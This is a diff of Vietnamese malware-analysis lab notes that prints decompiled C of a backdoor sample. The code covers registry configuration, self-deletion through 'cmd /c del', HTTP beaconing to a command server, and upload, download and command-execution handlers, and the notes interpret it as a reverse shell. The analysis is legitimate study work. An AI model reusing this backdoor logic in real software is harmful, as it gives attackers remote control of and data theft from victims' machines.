@@ -1,4 +1,4 @@
-# **Lab 3-1**
+ớn# **Lab 3-1**
 
 # 1.
 
@@ -300,7 +300,7 @@ Dropper, Keylogger.
 
 ## 1.
 
-Khi chạy, nó tự xóa file thực thi rồi tắt ngay lập tức. Dùng regshot, thấy nó cũng không chỉnh sửa gì.
+Khi chạy, nó tự xóa file thực thi rồi tắt ngay lập tức. Dùng regshot, thấy nó cũng không chỉnh sửa gì đặc biệt.
 
 # 2.
 
@@ -309,3 +309,528 @@ Nó xóa dấu vết làm cản trở việc phân tích.
 # 3.
 
 E k biết :(
+
+Phân tích tĩnh.
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  _BYTE v4[1024]; // [esp+10h] [ebp-181Ch] BYREF
+  _BYTE v5[1024]; // [esp+410h] [ebp-141Ch] BYREF
+  _BYTE v6[1024]; // [esp+810h] [ebp-101Ch] BYREF
+  _BYTE v7[1024]; // [esp+C10h] [ebp-C1Ch] BYREF
+  CHAR v8[1024]; // [esp+1024h] [ebp-808h] BYREF
+  CHAR ServiceName[1024]; // [esp+1428h] [ebp-404h] BYREF
+  const char *v10; // [esp+1828h] [ebp-4h]
+
+  if ( argc == 1 )
+  {
+    if ( sub_401000() == 0 )
+      sub_402410();
+    sub_402360();
+  }
+  else
+  {
+    v10 = argv[argc - 1];
+    if ( sub_402510(a1: v10) == 0 )
+      sub_402410();
+    if ( _mbscmp(Str1: (const unsigned __int8 *)argv[1], Str2: &byte_40C170) != 0 )
+    {
+      if ( _mbscmp(Str1: (const unsigned __int8 *)argv[1], Str2: &byte_40C16C) != 0 )
+      {
+        if ( _mbscmp(Str1: (const unsigned __int8 *)argv[1], Str2: &byte_40C168) != 0 )
+        {
+          if ( _mbscmp(Str1: (const unsigned __int8 *)argv[1], Str2: aCc) != 0 )
+            sub_402410();
+          if ( argc != 3 )
+            sub_402410();
+          if ( sub_401280(a1: v5, a2: 1024, a3: v6, a4: 1024, a5: v4, a6: 1024, a7: v7) == 0 )
+            sub_402E7E(a1: aKSHSPSPerS, a2: v5);
+        }
+        else
+        {
+          if ( argc != 7 )
+            sub_402410();
+          sub_401070(a1: argv[2], a2: argv[3], a3: argv[4], a4: argv[5]);
+        }
+      }
+      else if ( argc == 3 )
+      {
+        if ( sub_4025B0(a1: v8) != 0 )
+          return -1;
+        sub_402900(lpServiceName: v8);
+      }
+      else
+      {
+        if ( argc != 4 )
+          sub_402410();
+        sub_402900(lpServiceName: argv[2]);
+      }
+    }
+    else if ( argc == 3 )
+    {
+      if ( sub_4025B0(a1: ServiceName) != 0 )
+        return -1;
+      sub_402600(lpServiceName: ServiceName);
+    }
+    else
+    {
+      if ( argc != 4 )
+        sub_402410();
+      sub_402600(lpServiceName: argv[2]);
+    }
+  }
+  return 0;
+}
+```
+Đầu tiên, ta thấy ngay malware này có nhiều chức năng, phụ thuộc vào tham số nó  truyền vào.
+**Nếu không truyền vào tham số**
+```c
+if ( argc == 1 )
+{
+	if ( sub_401000() == 0 )
+	    sub_402410();
+    sub_402360();
+}
+int sub_401000()
+{
+  HKEY phkResult; // [esp+0h] [ebp-8h] BYREF
+  LSTATUS Value; // [esp+4h] [ebp-4h]
+
+  if ( RegOpenKeyExA(hKey: HKEY_LOCAL_MACHINE, lpSubKey: SubKey, ulOptions: 0, samDesired: 0xF003Fu, &phkResult) != 0 )
+    return 0;
+  Value = RegQueryValueExA(
+            hKey: phkResult,
+            lpValueName: ValueName,
+            lpReserved: nullptr,
+            lpType: nullptr,
+            lpData: nullptr,
+            lpcbData: nullptr);
+  if ( Value != 0 )
+  {
+    CloseHandle(hObject: phkResult);
+    return 0;
+  }
+  else
+  {
+    CloseHandle(hObject: phkResult);
+    return 1;
+  }
+}
+```
+Hàm này sẽ thực hiện query value `Configuration` nằm trong key `HKLM:\SOFTWARE\Microsoft \XPS`, nếu tồn tại, nó sẽ trả về `1`, còn nếu không thì trả về `0`.
+```c
+void __noreturn sub_402410()
+{
+  CHAR Filename[260]; // [esp+Ch] [ebp-208h] BYREF
+  CHAR Parameters[260]; // [esp+110h] [ebp-104h] BYREF
+
+  GetModuleFileNameA(hModule: nullptr, lpFilename: Filename, nSize: 0x104u);
+  GetShortPathNameA(lpszLongPath: Filename, lpszShortPath: Filename, cchBuffer: 0x104u);
+  strcpy(Parameters, aCDel);
+  strcat(Parameters, Filename);
+  strcat(Parameters, aNul);
+  ShellExecuteA(
+    hwnd: nullptr,
+    lpOperation: nullptr,
+    lpFile: File,
+    lpParameters: Parameters,
+    lpDirectory: nullptr,
+    nShowCmd: 0);
+  exit(Code: 0);
+}
+int sub_402360()
+{
+  int v1; // eax
+  char String[1024]; // [esp+0h] [ebp-1000h] BYREF
+  char v3[1024]; // [esp+400h] [ebp-C00h] BYREF
+  char name[1024]; // [esp+800h] [ebp-800h] BYREF
+  char v5[1024]; // [esp+C00h] [ebp-400h] BYREF
+
+  while ( 1 )
+  {
+    if ( sub_401280(a1: v3, a2: 1024, a3: name, a4: 1024, a5: String, a6: 1024, a7: v5) != 0 )
+      return 1;
+    atoi(String);
+    if ( sub_402020(name) != 0 )
+      break;
+    v1 = atoi(String: v5);
+    Sleep(dwMilliseconds: 1000 * v1);
+  }
+  return 1;
+}
+```
+Nếu query value thành công thì thực hiện hàm `sub_402410`, còn nếu không thì thực hiện hàm `sub_402360`
+Hàm `sub_402410` thực hiện lấy đường dẫn của file thực thi sau đó gọi `cmd.exe` với lệnh xóa `/c del ` để thực hiện xóa đi file thực thi, đúng với hành vi đã thấy khi chạy file.
+```c
+int sub_402360()
+{
+  int v1; // eax
+  char String[1024]; // [esp+0h] [ebp-1000h] BYREF
+  char v3[1024]; // [esp+400h] [ebp-C00h] BYREF
+  char name[1024]; // [esp+800h] [ebp-800h] BYREF
+  char v5[1024]; // [esp+C00h] [ebp-400h] BYREF
+
+  while ( 1 )
+  {
+    if ( sub_401280(a1: v3, a2: 1024, a3: name, a4: 1024, a5: String, a6: 1024, a7: v5) != 0 )
+      return 1;
+    atoi(String);
+    if ( sub_402020(name) != 0 )
+      break;
+    v1 = atoi(String: v5);
+    Sleep(dwMilliseconds: 1000 * v1);
+  }
+  return 1;
+}
+int __cdecl sub_401280(char *a1, int a2, char *a3, int a4, char *a5, int a6, char *a7)
+{
+  HKEY phkResult; // [esp+8h] [ebp-1010h] BYREF
+  LSTATUS v9; // [esp+Ch] [ebp-100Ch]
+  BYTE Data[4096]; // [esp+10h] [ebp-1008h] BYREF
+  DWORD cbData; // [esp+1010h] [ebp-8h] BYREF
+  BYTE *v12; // [esp+1014h] [ebp-4h]
+
+  cbData = 4097;
+  if ( RegOpenKeyExA(hKey: HKEY_LOCAL_MACHINE, lpSubKey: SubKey, ulOptions: 0, samDesired: 0xF003Fu, &phkResult) != 0 )
+    return 1;
+  v9 = RegQueryValueExA(
+         hKey: phkResult,
+         lpValueName: ValueName,
+         lpReserved: nullptr,
+         lpType: nullptr,
+         lpData: Data,
+         lpcbData: &cbData);
+  if ( v9 != 0 )
+  {
+    CloseHandle(hObject: phkResult);
+    return 1;
+  }
+  else
+  {
+    v12 = Data;
+    strcpy(a1, (const char *)Data);
+    v12 += strlen(a1) + 1;
+    strcpy(a3, (const char *)v12);
+    v12 += strlen(a3) + 1;
+    strcpy(a5, (const char *)v12);
+    v12 += strlen(a5) + 1;
+    strcpy(a7, (const char *)v12);
+    v12 += strlen(a7) + 1;
+    CloseHandle(hObject: phkResult);
+    return 0;
+  }
+}
+```
+Hàm `sub_401280` tiếp tục thực hiện kiểm tra value 1 lần nữa, nếu vẫn không được thì trả về 1, còn nếu có thì nó thực hiện copy các phần của chuỗi `Data` vào các vùng nhớ `a1`, `a3`, `a5`, `a7`...
+```c
+int __cdecl sub_402020(char *name)
+{
+  char *v2; // eax
+  char *v3; // eax
+  char *v4; // eax
+  u_short hostshort; // [esp+4h] [ebp-424h]
+  FILE *Stream; // [esp+8h] [ebp-420h]
+  const char *Command; // [esp+Ch] [ebp-41Ch]
+  u_short v8; // [esp+10h] [ebp-418h]
+  char *lpFileName; // [esp+14h] [ebp-414h]
+  u_short v10; // [esp+18h] [ebp-410h]
+  char *v11; // [esp+1Ch] [ebp-40Ch]
+  const char *String; // [esp+20h] [ebp-408h]
+  int v13; // [esp+24h] [ebp-404h]
+  char Str1[1024]; // [esp+28h] [ebp-400h] BYREF
+
+  if ( sub_401E60(a1: Str1, a2: 1024) != 0 )
+    return 1;
+  if ( strncmp(Str1, Str2: Str2, MaxCount: strlen(Str2)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    String = strtok(String: nullptr, Delimiter: Delimiter);
+    v13 = atoi(String);
+    Sleep(dwMilliseconds: 1000 * v13);
+  }
+  else if ( strncmp(Str1, Str2: aUpload, MaxCount: strlen(aUpload)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    v2 = strtok(String: nullptr, Delimiter: Delimiter);
+    v10 = atoi(String: v2);
+    v11 = strtok(String: nullptr, Delimiter: Delimiter);
+    if ( sub_4019E0(name, hostshort: v10, lpFileName: v11) != 0 )
+      return 1;
+  }
+  else if ( strncmp(Str1, Str2: aDownload, MaxCount: strlen(aDownload)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    v3 = strtok(String: nullptr, Delimiter: Delimiter);
+    v8 = atoi(String: v3);
+    lpFileName = strtok(String: nullptr, Delimiter: Delimiter);
+    if ( sub_401870(name, hostshort: v8, lpFileName) != 0 )
+      return 1;
+  }
+  else if ( strncmp(Str1, Str2: aCmd_0, MaxCount: strlen(aCmd_0)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    v4 = strtok(String: nullptr, Delimiter: Delimiter);
+    hostshort = atoi(String: v4);
+    Command = strtok(String: nullptr, Delimiter: asc_40C0A4);
+    Stream = _popen(Command, Mode: Mode);
+    if ( Stream == nullptr )
+      return 1;
+    if ( sub_401790(name, hostshort, Stream) != 0 )
+    {
+      _pclose(Stream);
+      return 1;
+    }
+    _pclose(Stream);
+  }
+  else
+  {
+    strncmp(Str1, Str2: aNothing, MaxCount: strlen(aNothing));
+  }
+  return 0;
+}
+int __cdecl sub_401E60(char *a1, int a2)
+{
+  u_short hostshort[2]; // [esp+8h] [ebp-1424h] BYREF
+  char name[1024]; // [esp+Ch] [ebp-1420h] BYREF
+  char *v5; // [esp+40Ch] [ebp-1020h]
+  int v6; // [esp+410h] [ebp-101Ch] BYREF
+  char *v7; // [esp+414h] [ebp-1018h]
+  int v8[4]; // [esp+418h] [ebp-1014h] BYREF
+  char *v9; // [esp+428h] [ebp-1004h]
+  char Str[4096]; // [esp+42Ch] [ebp-1000h] BYREF
+
+  v6 = 4096;
+  if ( sub_401420(a1: name, a2: 1024) != 0 )
+    return 1;
+  if ( sub_401470(a1: hostshort) != 0 )
+    return 1;
+  if ( sub_401D80(a1: v8) != 0 )
+    return 1;
+  if ( sub_401AF0(name, hostshort: hostshort[0], a3: (int)v8, Str, a5: (int)&v6) != 0 )
+    return 1;
+  v9 = strstr(Str, SubStr: asc_40C090);
+  if ( v9 == nullptr )
+    return 1;
+  v5 = v9;
+  v9 = strstr(Str: v9, SubStr: byte_40C088);
+  if ( v9 == nullptr )
+    return 1;
+  v7 = v9;
+  if ( v9 - v5 + 1 > a2 )
+    return 1;
+  qmemcpy(a1, &v5[strlen(asc_40C090)], v7 - v5 - strlen(asc_40C090));
+  a1[v7 - v5 - strlen(asc_40C090)] = 0;
+  return 0;
+}
+```
+Hàm `sub_1420` và `sub_1470` cũng tương tự hàm trên, nó thực hiện truy vấn value của key, rồi lấy các trường thông tin cần thiết.
+```c
+int __cdecl sub_401D80(char *a1)
+{
+  __time32_t v1; // eax
+  int i; // [esp+0h] [ebp-8h]
+  int j; // [esp+0h] [ebp-8h]
+  int k; // [esp+0h] [ebp-8h]
+  char *v7; // [esp+4h] [ebp-4h]
+  char *v8; // [esp+4h] [ebp-4h]
+
+  v1 = time(Time: nullptr);
+  time_rand(a1: v1);
+  for ( i = 0; i < 4; ++i )
+    *a1++ = sub_401D10();
+  *a1 = '/';
+  v7 = a1 + 1;
+  for ( j = 0; j < 4; ++j )
+    *v7++ = sub_401D10();
+  *v7 = 46;
+  v8 = v7 + 1;
+  for ( k = 0; k < 3; ++k )
+    *v8++ = sub_401D10();
+  *v8 = 0;
+  return 0;
+}
+int __cdecl time_rand(int a1)
+{
+  dword_40C180 = a1;
+  return a1;
+}
+char sub_401D10()
+{
+  char v1; // [esp+0h] [ebp-4h]
+
+  do
+    v1 = rand();
+  while ( (v1 < '0' || v1 > '9') && (v1 < 'a' || v1 > 'z') && (v1 < 'A' || v1 > 'Z') );
+  return v1;
+}
+```
+Hàm này thực hiện sinh 1 bộ 4 byte ngẫu nhiên, rồi ghép với kí tự `/`, rồi lưu vào `a1`.
+```c
+int __cdecl sub_401AF0(char *name, u_short hostshort, const char *a3, char *Str, _DWORD *a5)
+{
+  char v6[512]; // [esp+10h] [ebp-60Ch] BYREF
+  SOCKET s; // [esp+210h] [ebp-40Ch] BYREF
+  int v8; // [esp+214h] [ebp-408h]
+  char buf[1024]; // [esp+218h] [ebp-404h] BYREF
+  signed int v10; // [esp+618h] [ebp-4h]
+
+  s = 0;
+  v8 = 0;
+  if ( sub_401640(a1: (int)&s, name, hostshort) != 0 )
+    return 1;
+  strcpy(buf, aGet);
+  strcat(buf, a3);
+  strcat(buf, aHttp10);
+  if ( send(s, buf, len: strlen(buf), flags: 0) == -1 )
+  {
+    closesocket(s);
+    WSACleanup();
+    return 1;
+  }
+  do
+  {
+    v10 = recv(s, buf: v6, len: 512, flags: 0);
+    if ( v10 <= 0 )
+    {
+      if ( v10 != 0 )
+      {
+LABEL_7:
+        sub_401740(a1: &s);
+        return 1;
+      }
+      continue;
+    }
+    if ( (unsigned int)(v10 + v8) > *a5 )
+      goto LABEL_7;
+    qmemcpy(&Str[v8], v6, v10);
+    v8 += v10;
+    if ( strstr(Str, SubStr: SubStr) != nullptr )
+      break;
+  }
+  while ( v10 > 0 );
+  if ( sub_401740(a1: &s) != 0 )
+    return 1;
+  *a5 = v8;
+  return 0;
+}
+int __cdecl sub_401640(SOCKET *a1, char *name, u_short hostshort)
+{
+  struct sockaddr v4; // [esp+0h] [ebp-1A4h] BYREF
+  struct hostent *v5; // [esp+10h] [ebp-194h]
+  struct WSAData WSAData; // [esp+14h] [ebp-190h] BYREF
+
+  *a1 = -1;
+  if ( WSAStartup(wVersionRequested: 0x202u, lpWSAData: &WSAData) != 0 )
+    return 1;
+  v5 = gethostbyname(name);
+  if ( v5 == nullptr || (*a1 = socket(af: 2, type: 1, protocol: 6), *a1 == -1) )
+  {
+    WSACleanup();
+    return 1;
+  }
+  else
+  {
+    v4.sa_family = 2;
+    *(_DWORD *)&v4.sa_data[2] = **(_DWORD **)v5->h_addr_list;
+    *(_WORD *)v4.sa_data = htons(hostshort);
+    if ( connect(s: *a1, name: &v4, namelen: 16) == -1 )
+    {
+      closesocket(s: *a1);
+      *a1 = -1;
+      WSACleanup();
+      return 1;
+    }
+    else
+    {
+      return 0;
+    }
+  }
+}
+```
+Hàm này thực hiện truy vấn DNS để lấy IP của host (`name` truyền vào), mở socket, và kết nối đến host port tương ứng.
+Sau khi kết nối xong, ở hàm `sub_401AF0`, nó thực hiện cụm lệnh.
+```c
+strcpy(buf, aGet);
+strcat(buf, a3);
+strcat(buf, aHttp10);
+```
+Mục đích là để tạo thông điệp HTTP GET. Struct của 1 GET request là.
+```http
+GET /path/file.html HTTP/1.0\r\n      ← 1. Request line
+Host: example.com\r\n                 ← 2. Headers (0 hoặc nhiều dòng)
+User-Agent: Mozilla/4.0\r\n
+\r\n                                  ← 3. Dòng trống: kết thúc request
+```
+Vậy thì `a3` (là `v8` truyền vào), sẽ là 1 đường dẫn.
+Sau đó, nó gửi request đi và lắng nghe phản hồi.
+Quay lại hàm `sub_401E60`
+```c
+v9 = strstr(Str, SubStr: asc_40C090);
+  if ( v9 == nullptr )
+    return 1;
+  v5 = v9;
+  v9 = strstr(Str: v9, SubStr: byte_40C088);
+  if ( v9 == nullptr )
+    return 1;
+  v7 = v9;
+  if ( v9 - v5 + 1 > a2 )
+    return 1;
+  qmemcpy(a1, &v5[strlen(asc_40C090)], v7 - v5 - strlen(asc_40C090));
+  a1[v7 - v5 - strlen(asc_40C090)] = 0;
+  return 0;
+```
+Phần còn lại của hàm thực hiện parse thông điệp phản hồi, nó trích xuất payload được bọc trong cặp placeholder $`'`'$ .
+Quay lại hàm `sub_402020`.
+```c
+if ( strncmp(Str1, Str2: Str2, MaxCount: strlen(Str2)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    String = strtok(String: nullptr, Delimiter: Delimiter);
+    v13 = atoi(String);
+    Sleep(dwMilliseconds: 1000 * v13);
+  }
+  else if ( strncmp(Str1, Str2: aUpload, MaxCount: strlen(aUpload)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    v2 = strtok(String: nullptr, Delimiter: Delimiter);
+    v10 = atoi(String: v2);
+    v11 = strtok(String: nullptr, Delimiter: Delimiter);
+    if ( sub_4019E0(name, hostshort: v10, lpFileName: v11) != 0 )
+      return 1;
+  }
+  else if ( strncmp(Str1, Str2: aDownload, MaxCount: strlen(aDownload)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    v3 = strtok(String: nullptr, Delimiter: Delimiter);
+    v8 = atoi(String: v3);
+    lpFileName = strtok(String: nullptr, Delimiter: Delimiter);
+    if ( sub_401870(name, hostshort: v8, lpFileName) != 0 )
+      return 1;
+  }
+  else if ( strncmp(Str1, Str2: aCmd_0, MaxCount: strlen(aCmd_0)) == 0 )
+  {
+    strtok(String: Str1, Delimiter: Delimiter);
+    v4 = strtok(String: nullptr, Delimiter: Delimiter);
+    hostshort = atoi(String: v4);
+    Command = strtok(String: nullptr, Delimiter: asc_40C0A4);
+    Stream = _popen(Command, Mode: Mode);
+    if ( Stream == nullptr )
+      return 1;
+    if ( sub_401790(name, hostshort, Stream) != 0 )
+    {
+      _pclose(Stream);
+      return 1;
+    }
+    _pclose(Stream);
+  }
+  else
+  {
+    strncmp(Str1, Str2: aNothing, MaxCount: strlen(aNothing));
+  }
+  return 0;
+}
+```
+Nó thực hiện kiểm tra phản hồi với các chuỗi lệnh định nghĩa trước. Hành vi này cho thấy nó là 1 reverse shell.
+Các lệnh nó hỗ trợ gồm: upload dữ liệu, download dữ liệu và mở cmd.
+Ngoài tùy chọn không tham số, malware còn hỗ trợ một số các tham số khác, ta cũng phân tích tương tự.
+
